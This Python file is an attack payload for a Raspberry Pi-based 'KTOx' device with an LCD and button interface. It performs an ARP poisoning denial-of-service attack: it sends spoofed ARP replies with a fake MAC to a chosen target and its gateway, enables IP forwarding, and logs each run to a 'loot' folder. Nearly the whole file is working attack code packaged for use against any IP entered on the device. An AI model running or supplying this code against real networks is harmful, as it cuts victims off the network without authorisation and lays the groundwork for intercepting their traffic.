#!/usr/bin/env python3
"""
KTOx *payload* – **ARP Poisoning DoS Attack**
================================================
This payload performs an ARP Poisoning Denial of Service (DoS) attack.
It spoofs ARP replies to redirect traffic between a target IP and the
gateway IP, effectively cutting off the target's network access.

Features:
- Interactive UI for entering target and gateway IP addresses.
- Uses Scapy to send spoofed ARP packets.
- Displays current status (ACTIVE/STOPPED) on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring ARP tables are restored.
- Dynamically determines the active network interface.

Controls:
- MAIN SCREEN:
    - OK: Start ARP Poisoning.
    - KEY1: Edit Target IP.
    - KEY2: Edit Gateway IP.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- ATTACKING SCREEN:
    - KEY3: Stop Attack and Exit.
"""

import sys
import os
import time
import signal
import subprocess
import threading

KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
wifi_subdir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
    sys.path.insert(0, wifi_subdir)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import ktox_integration as rji
from scapy.all import Ether, ARP, send, srp, conf
conf.verb = 0

TARGET_IP = "192.168.1.10"
GATEWAY_IP = "192.168.1.1"
FAKE_MAC = "00:11:22:33:44:55" # MAC address to use for spoofing

LOOT_DIR = os.path.join(KTOX_ROOT, 'loot', 'dos_arp_poison_dos')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event()
status_msg = "Press OK to start"
current_ip_input = ""
ip_input_cursor_pos = 0
current_ip_type = ""
ATTACK_INTERFACE = None
IP_FORWARDING_ENABLED_BY_US = False

def cleanup(*_):
    global running, ATTACK_INTERFACE, IP_FORWARDING_ENABLED_BY_US
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2)
        
        if ATTACK_INTERFACE:
            draw_ui(screen_state="cleaning", message_lines=["Restoring ARP..."])
            restore_arp_tables(ATTACK_INTERFACE)
        
        if IP_FORWARDING_ENABLED_BY_US:
            try:
                subprocess.run("sysctl -w net.ipv4.ip_forward=0", shell=True, check=True, capture_output=True)
                print("IP forwarding disabled.", file=sys.stderr)
            except Exception as e:
                print(f"Error disabling IP forwarding: {e}", file=sys.stderr)
        
        save_loot_snapshot()
        print("ARP Poison DoS cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot():
    """Save a loot snapshot with attack stats."""
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        loot_file = os.path.join(LOOT_DIR, f"arp_poison_dos_{timestamp}.txt")
        with open(loot_file, 'w') as f:
            f.write("ARP Poison DoS\n")
            f.write(f"Target IP: {TARGET_IP}\n")
            f.write(f"Gateway IP: {GATEWAY_IP}\n")
            f.write(f"Interface: {ATTACK_INTERFACE}\n")
            f.write(f"Fake MAC: {FAKE_MAC}\n")
            f.write(f"IP forwarding enabled by payload: {IP_FORWARDING_ENABLED_BY_US}\n")
            f.write(f"Timestamp: {timestamp}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Error saving loot: {e}", file=sys.stderr)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "ARP Poison DoS", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Gateway IP:", font=FONT, fill="white")
        d.text((5, 80), GATEWAY_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "OK=Start | KEY1=Target | KEY2=Gateway", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 40), "ARP Poisoning...", font=FONT_TITLE, fill="red")
        d.text((5, 60), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 75), f"Gateway: {GATEWAY_IP}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "cleaning":
        d.text((5, 50), "Cleaning up...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), message_lines[0] if message_lines else "", font=FONT, fill="white")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip, ip_type):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    
    # The character set for IP address input
    char_set = "0123456789."
    char_index = 0
    
    input_ip = ""
    
    while running:
        # Draw the UI for IP input
        img = Image.new("RGB", (128, 128), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {ip_type} IP", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
        
        # Display the current input
        d.text((5, 40), f"IP: {input_ip}", font=FONT, fill="white")
        
        # Display the character selection
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill="yellow")
        
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill="cyan")
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            input_ip += char_set[char_index]
            time.sleep(0.2)

        if btn == "KEY1": # Backspace
            input_ip = input_ip[:-1]
            time.sleep(0.2)

        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)

        # Let's use KEY2 to confirm the IP
        if GPIO.input(PINS["KEY2"]) == 0:
            parts = input_ip.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return input_ip
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                input_ip = "" # Reset on invalid
        
        time.sleep(0.1)
    return None

def get_mac(ip, interface):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=interface)
        if ans:
            return ans[0][1].hwsrc
    except Exception as e:
        print(f"Error getting MAC for {ip} on {interface}: {e}", file=sys.stderr)
        draw_ui(message_lines=[f"Error getting MAC for {ip}", f"{str(e)[:20]}"])
        time.sleep(3)
    return None

def restore_arp_tables(interface):
    global TARGET_IP, GATEWAY_IP
    if not TARGET_IP or not GATEWAY_IP:
        return
    
    target_mac = get_mac(TARGET_IP, interface)
    gateway_mac = get_mac(GATEWAY_IP, interface)
    
    if target_mac and gateway_mac:
        print(f"Restoring ARP tables for {TARGET_IP} and {GATEWAY_IP}...", file=sys.stderr)
        # Restore target's ARP table
        send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac), iface=interface, count=7, verbose=0)
        # Restore gateway's ARP table
        send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac), iface=interface, count=7, verbose=0)
        print("ARP tables restored.", file=sys.stderr)
    else:
        print("Could not restore ARP tables (MACs not found).", file=sys.stderr)
        draw_ui(message_lines=["Could not restore ARP tables.", "(MACs not found)"])
        time.sleep(3)

def arp_poison_worker(target_ip, gateway_ip, interface):
    global attack_stop_event
    
    target_mac = get_mac(target_ip, interface)
    gateway_mac = get_mac(gateway_ip, interface)
    
    if not target_mac:
        print(f"Could not get MAC for target {target_ip}", file=sys.stderr)
        draw_ui(message_lines=[f"Could not get MAC for target {target_ip}"])
        attack_stop_event.set()
        return
    if not gateway_mac:
        print(f"Could not get MAC for gateway {gateway_ip}", file=sys.stderr)
        draw_ui(message_lines=[f"Could not get MAC for gateway {gateway_ip}"])
        attack_stop_event.set()
        return
    
    print(f"Starting ARP poisoning: {target_ip} ({target_mac}) <-> {gateway_ip} ({gateway_mac}) on {interface}", file=sys.stderr)
    
    # Craft ARP responses
    # Tell target that we are the gateway
    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=FAKE_MAC)
    # Tell gateway that we are the target
    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=FAKE_MAC)
    
    try:
        while not attack_stop_event.is_set():
            send(packet1, iface=interface, verbose=0)
            send(packet2, iface=interface, verbose=0)
            time.sleep(2)
    except Exception as e:
        print(f"[ERROR] ARP Poisoning worker failed: {e}", file=sys.stderr)
        draw_ui(message_lines=["Attack failed!", f"{str(e)[:20]}"])
        attack_stop_event.set() # Stop the attack on error

def run_attack():
    global status_msg, attack_thread, ATTACK_INTERFACE, IP_FORWARDING_ENABLED_BY_US
    
    interface = rji.get_best_interface()
    if not interface:
        draw_ui(message_lines=["No active network", "interface found!"])
        time.sleep(3)
        return False
    
    ATTACK_INTERFACE = interface
    
    try:
        # Enable IP forwarding
        subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, check=True, capture_output=True)
        IP_FORWARDING_ENABLED_BY_US = True
        print("IP forwarding enabled.", file=sys.stderr)
    except Exception as e:
        print(f"Error enabling IP forwarding: {e}", file=sys.stderr)
        draw_ui(message_lines=["Error enabling IP forwarding!", f"{str(e)[:20]}"])
        time.sleep(3)
        return False

    draw_ui(screen_state="attacking", message_lines=["Starting attack..."])
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=arp_poison_worker, args=(TARGET_IP, GATEWAY_IP, interface), daemon=True)
    attack_thread.start()
    return True

if __name__ == "__main__":
    try:
        # Check if Scapy is installed
        try:
            from scapy.all import Ether
        except ImportError:
            draw_ui(message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if attack_thread and attack_thread.is_alive():
                draw_ui("attacking")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                time.sleep(0.1) # Shorter sleep while attacking to keep UI responsive
            else:
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    run_attack()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_ip = handle_ip_input_logic(TARGET_IP, "Target")
                    if new_ip:
                        TARGET_IP = new_ip
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    new_ip = handle_ip_input_logic(GATEWAY_IP, "Gateway")
                    if new_ip:
                        GATEWAY_IP = new_ip
                    time.sleep(BUTTON_DEBOUNCE_TIME)

            time.sleep(0.05) # General loop sleep

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("ARP Poison DoS payload finished.")